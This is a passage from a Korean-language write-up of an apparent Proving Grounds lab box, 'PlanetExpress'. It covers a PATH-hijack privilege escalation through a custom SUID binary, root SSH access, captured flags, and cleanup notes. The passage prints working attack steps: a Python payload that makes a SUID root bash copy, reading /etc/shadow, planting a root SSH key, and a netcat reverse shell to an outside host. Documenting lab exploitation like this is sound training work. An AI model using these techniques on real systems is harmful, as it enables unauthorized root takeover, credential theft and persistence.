#!/usr/bin/python3
import os
open('/tmp/.x/st2.txt','w').write(str((os.getuid(),os.geteuid())))
try:
    os.setreuid(0,0)
    os.system('cp /bin/bash /tmp/.x/rootbash; chmod 4755 /tmp/.x/rootbash; id > /tmp/.x/st3.txt')
except Exception as e:
    open('/tmp/.x/st3.txt','w').write('ERR '+str(e))
```
— 출처: `~/PG/PlanetExpress/payload_py.php` 경유로 심음(`payload_pathhijack.php` 는 첫 시도의 `#!/bin/sh` 판)

`st2.txt` 를 `setreuid` 앞에 쓰는 설계 — 실패해도 "euid 가 넘어오긴 했는가"는 남음.

```text
PATH=/tmp/.x:$PATH timeout 30 /usr/sbin/relayd -b up >/dev/null 2>&1

uid,euid seen:
(33, 0)
st3:
uid=0(root) gid=33(www-data) groups=33(www-data)

-rwsr-xr-x  1 root     www-data 1168776 Aug 20 03:15 rootbash
```
— 출처: `~/PG/PlanetExpress/try12_python_hijack.log`

`(33, 0)` — euid 는 확실히 넘어옴. `os.setreuid(0,0)` 으로 real uid 까지 0 으로 올린 뒤 `cp`/`chmod` 실행 — `rootbash` 가 root 소유 SUID. 이후 모든 root 작업은 이 `rootbash` 로 수행.

```text
/tmp/.x/rootbash -p -c "id; echo ---SHADOW---; cat /etc/shadow; ..."
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
— 출처: `~/PG/PlanetExpress/enum_root_shadow.log`

`-p` 를 빼면 방금 확인한 이유로 bash 가 euid 를 버림. `/etc/shadow` 도 확보했으나 rockyou 로는 안 깨짐(`john.log` — 로드까지만, 크랙 줄 없음).

**대화형 셸 — SSH:** 리버스셸 위의 root 는 있지만 플래그 증거는 대화형 세션이 낫고 22 는 열려 있음.

```text
grep -vE '^#|^$' /etc/ssh/sshd_config
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server
```

`PermitRootLogin yes`. 일회용 키 설치.

```text
/tmp/.x/rootbash -p -c "mkdir -p /root/.ssh && cp /tmp/.x/k.pub /root/.ssh/authorized_keys
                        && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
                        && chown -R root:root /root/.ssh"
```

키 설치 확인은 `try13_install_key.log`(`/root/.ssh/authorized_keys`, `-rw------- root root 98`). 이후 `ssh -i pe_key root@192.168.248.205`.

**부록 — 방화벽 규칙(root 로 확인, 리버스셸 443 실패의 근거):**

```text
iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 9000 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A INPUT -j DROP
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 9000 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 9000 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A OUTPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A OUTPUT -j DROP
```

같은 로그의 `iptables -L -v -n` 카운터 — 어느 `DROP` 이 실제로 물었는지가 여기서 갈림.

```text
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
 474K   56M ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW,RELATED,ESTABLISHED
    0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
    2   120 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 state NEW,ESTABLISHED
 131K 5260K DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0
```
— 출처: `~/PG/PlanetExpress/root_enum_fw.log` (`-S` 는 전문, `-L -v -n` 은 위 4행만 발췌)

나가는 건 dport 53·80·9000 뿐이고 443 은 OUTPUT 마지막 `DROP` 에 걸림 — 카운터 `131K` 가 그 규칙이 실제로 물었다는 증거. 반대로 **INPUT 의 `DROP` 은 `0 packets` 이라 한 번도 안 물었음** — 앞선 `ctstate NEW,RELATED,ESTABLISHED` 가 새 연결까지 받아 거기서 끝나기 때문. nmap 이 본 `filtered` 65532개는 이 호스트가 만든 것이 아님(Service Enumeration 절).

### Post-Exploitation

**Proof.txt value:** `4dca621ae70cad152924516c7789381c`

두 값 모두 SSH 대화형 세션에서 원위치 `cat` 으로 읽음 — FastCGI/리버스셸이 아니라 SSH 인 것은 OSCP 채점 규정(웹 기반 셸로 얻은 플래그는 0점) 때문. astro 로는 root 세션에서 `su - astro` 로 내려감.

```bash
root@planetexpress:~# whoami; id; hostname; hostname -I; date; cat /root/proof.t
xt
root
uid=0(root) gid=0(root) groups=0(root)
planetexpress
192.168.248.205
Thu 20 Aug 2026 03:17:03 AM EDT
4dca621ae70cad152924516c7789381c
root@planetexpress:~# su - astro
$ whoami; id; hostname; hostname -I; date; cat /home/astro/local.txt
astro
uid=1000(astro) gid=1000(astro) groups=1000(astro)
planetexpress
192.168.248.205
Thu 20 Aug 2026 03:17:17 AM EDT
484f662f955b828510887c65d2565a7f
$
```
— 출처: `~/PG/PlanetExpress/proof_session_raw.txt` 전문(앞의 SSH 배너·MOTD 생략). 프롬프트 `root@planetexpress:~#` 와 `su - astro` 뒤의 `$` 는 **타겟 pty 세션에서 그대로 캡처된 것** — 웹셸이 아니라 대화형 셸에서 읽었다는 근거라 원문 그대로 둠

`~/PG/PlanetExpress/proof_user.txt`(`/home/astro/local.txt`)·`proof_root.txt`(`/root/proof.txt`) 에 동일 값 재확인 저장. 타겟 시계는 EDT — Kali 로그의 KST 와 13시간 차이지만 타임존 표기 차이일 뿐 서로 어긋난 것은 아님.

미끼는 없음. `/home/astro` 에는 `local.txt` 하나뿐이고 `.bash_history` 는 `/dev/null` 심볼릭 링크(root 쪽도 동일) — 박스 제작자가 히스토리를 일부러 죽여둠.

**남긴 흔적**

타겟 쪽 — 정리 후 상태를 로그로 확인:

| 흔적 | 처리 | 확인 방법 |
|---|---|---|
| `/var/www/html/planetexpress/assets/relayd.bin` (바이너리 회수용 복사본) | 삭제 | `ls -la assets/` → `.gitignore` 만 남음 |
| `/tmp/.x/` (가짜 `iptables`, `rootbash`, `k.pub`, `t.sh`, 디버그 `st.txt`·`st2.txt`·`st3.txt`·`whoami.txt`) | 재귀 삭제 | `ls -la /tmp/` → 부팅 시 항목만 남음(`cleanup_target.log`) |
| `/tmp/.pf` (리버스셸 FIFO) | 삭제 | 위와 같음 |
| 리버스셸 프로세스(`nc 192.168.45.207 80`, `/bin/sh -i`) | `pkill -f` 로 종료 | `ps -ef \| grep -E "nc \|sh -i"` → 0줄 |
| `/root/.ssh/authorized_keys` + `/root/.ssh/`(우리가 만든 디렉터리) | 재귀 삭제 | `ls -la /root/` → `.ssh` 없음(링크수 4→3). 재접속 시도 → `Permission denied (publickey,password)` |

— 출처: `~/PG/PlanetExpress/cleanup_target.log` (다섯 행 전부 이 로그에 실행 트레이스와 정리 후 목록이 남아 있음)

Kali 쪽 — 정리했으나 **산출물로 남기지 않음**:

- tmux 세션(`pe_nmap`·`pe_gob`·`pe_john`·`pe_root`·`pe_shell80`·`pe_td2`)과 443/80 리스너 종료, 로컬 검증용 setuid 래퍼(`~/dashtest`·`/tmp/dashtest`) 삭제. `[가정]` **`tmux ls`·`ss -lntp` 결과를 파일로 떨어뜨리지 않았고 `~/.zsh_history` 에도 이 박스 명령이 한 줄도 없어**(비대화형 SSH 로 돌린 탓) 「했다」는 기록만 있고 확인 출력이 없음

되돌리지 않은 것(판단): 없음 — 타겟 원본 **파일**은 하나도 수정하지 않음, 추가한 것만 지움(`/tmp`·`/root` 디렉터리 mtime 변화는 남음). `md5sum` 대조가 필요한 항목이 없는 이유.

미확인 — **이 박스는 정지·반납됨.** 아래는 재접속으로 확인 불가:
- `/tmp/systemd-private-*` 와 `vmware-root_*` 는 원래 있던 것으로 보이나 침투 전 스냅샷을 안 찍어 대조는 못 함. mtime 이 `Aug 3 2024` 라 우리 것이 아닌 건 거의 확실
- php-fpm 워커가 남긴 로그(`/var/log/php7.3-fpm.log`, Apache access log)는 지우지 않음 — 이 랩에서 요구되는 정리가 아니고 지우는 쪽이 오히려 파괴적

### 관측 없음 — 박스 정지로 재수집 불가

| 항목 | 왜 필요했나 | 상태 |
|---|---|---|
| `/plugins/PicoTest.php` 원본 소스 | 파일이 `phpinfo()` 만 부르는지, Pico 플러그인 클래스 안에서 부르는지 | 회수 못 함. 렌더된 HTML(`picotest_out.html`)만 있음. "phpinfo() 였다"는 그 출력에서 끌어낸 추론 |
| phpinfo 값 오염의 지속 메커니즘 | 요청 단위여야 할 `PHP_ADMIN_VALUE` 가 왜 다음 요청까지 살아남았는가 | 미검증. fpm 워커 재시작 후 Apache 경유로만 다시 읽어야 확인되는데 못 함 |
| relayd 실행 시 `/proc/<pid>/stat` 조상 체인 | 부모/자식 권한 대비를 프로세스 계보까지 확인 | 안 봄. `ps -o pid,ppid,ruser,euser -p $PPID` 와 `/proc/self/status` 의 Uid 4쌍으로만 확인(`try11_suid_debug.log`). 결론(SUID 로 euid 만 넘어오고 dash 가 버림)에는 영향 없음 |
| 침투 전 `/tmp` 스냅샷 | `systemd-private-*`·`vmware-root_*` 가 원래 있던 것인지 | 못 찍음. mtime 이 `Aug 3 2024` 라 우리 것이 아닌 건 거의 확실(「남긴 흔적」 참조) |
| 리버스셸 `proc_open` 핸들·서브셸의 개별 기여 | 443→80 전환 때 세 변수를 한꺼번에 바꿈 | 분리 실험 안 함 |
| `relayd` 의 `-a`·`-r`·`-i`·`-U` 액션 | `-b up` 외에 다른 root 실행 경로가 있는지 | 안 열어봄. `-b up` 으로 목적을 달성해 멈춤 — 심볼 `main.addAndRemoveService`·`main.getClientIP` 가 대응하나 실행은 안 해봄 |
| Pico CMS 2.1.4 자체 벡터 | `debug: true` + Twig 1.44.6 조합의 SSTI·스택트레이스 유출, `PicoOutput` 의 `formats: [content, raw, json]` | 안 건드림. 진입점이 먼저 열려 넘어감 — 통했을지는 `[가정]` 조차 못 세움 |
| `/etc/shadow` sha512 2건의 룰·다른 사전 크랙 | rockyou 단독으로 안 깨짐 | rockyou 만 돌림(`john.log` — 로드까지만, 크랙 줄 없음). 룰 적용·다른 사전은 시도 안 함 |

## 관련

- Pico CMS — <https://picocms.org/> (2.1.4, 이 박스에서 취약점으로 쓰이진 않음)
- php-fpm 풀 설정 `listen`/`listen.allowed_clients` — 배포판의 `/etc/php/*/fpm/pool.d/www.conf` 주석이 1차 사료
- FastCGI 레코드 포맷 — <https://fastcgi-archives.github.io/FastCGI_Specification.html>
- Go `os/exec.Command` 의 `LookPath` 동작 — 이름에 `/` 가 없으면 `$PATH` 탐색
- **CVE-2019-11043**(php-fpm + nginx `fastcgi_split_path_info` 언더플로)은 이 박스와 무관 — nginx 도 아니고 취약한 정규식도 아니며 그냥 9000 이 인터넷에 열려 있었을 뿐. 9000/php-fpm 을 보면 이 CVE 가 먼저 떠오르지만 방향이 다름
- GTFOBins 는 여기서 쓸 게 없음 — `relayd` 는 커스텀 바이너리
- [[Fowsniff]] — 부모 프로세스 체인을 `/proc/<pid>/stat` 으로 실측해 "왜 root 로 도는가"를 증명한 사례. 여기서는 거기까지 안 가고 `ps -o euser -p $PPID` + `/proc/self/status` 의 Uid 4쌍으로 끊음
- [[Crane]] · [[RubyDome]] · [[Astronaut]] — "응답이 성공을 뜻하지 않는다" 패턴. 여기서는 파일이 생겼다고 권한이 넘어온 게 아니었음
- [[Hub]] · [[Levram]] · [[Squid]] — 버전·서비스 판정은 독립 근거 2개. 여기서도 ① Apache 404 본문이 fpm 의 것(= PHP 는 fpm 이 돌린다) ② 9000 에 FastCGI 레코드를 보내 응답을 받음(= 그 fpm 이 9000) 두 단계로 확정. ①만으로 9000 을 단정하면 안 됨
- [[GLPI]] · [[Wheels]] · [[Assignment]] — SUID 스크립트를 `sh` 로 넘기면 euid 가 날아가는 같은 함정
- [[_PLAYBOOK]] — 시행착오·기법 카드·시험 관점의 유일한 소재지
- [[_PLAYBOOK#A-1-24. 정찰 페이지가 방금 «내가 보낸 값»을 되비친다]] · [[_PLAYBOOK#B-3-13. Go 정적 SUID 바이너리는 `strings` 가 아니라 «심볼»로 읽는다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#A-2-14. 웹셸을 심을 웹루트를 «틀린 곳»에 골랐다]] · [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]]
- [[_STATUS]] — 283개 전수 진행현황
